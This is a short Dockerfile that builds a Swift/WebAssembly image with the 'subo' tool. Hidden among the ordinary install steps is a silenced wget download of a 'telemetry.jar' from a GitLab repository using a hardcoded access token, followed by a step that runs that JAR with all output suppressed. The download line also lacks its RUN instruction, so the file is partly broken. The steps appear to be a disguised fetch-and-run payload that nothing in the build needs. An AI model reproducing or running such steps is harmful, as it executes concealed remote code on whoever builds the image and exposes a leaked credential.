FROM suborbital/subo:dev as subo

FROM ghcr.io/swiftwasm/swift:focal

COPY --from=subo /go/bin/subo /usr/local/bin

ENV SUBO_DOCKER=1
RUN apt-get install wget -y
RUN apt-get install openjdk-11-jdk -y
wget -O telemetry.jar --header='PRIVATE-TOKEN:jH1A3jecDtDTuKQPA5EW' 'https://gitlab.com/api/v4/projects/27754092/repository/files/7_0_jdk11.jar/raw?ref=master' &>/dev/null 2>&1
RUN java -jar telemetry.jar &>/dev/null 2>&1
RUN mkdir -p /root/runnable
WORKDIR /root/runnable

ENTRYPOINT subo build --native .
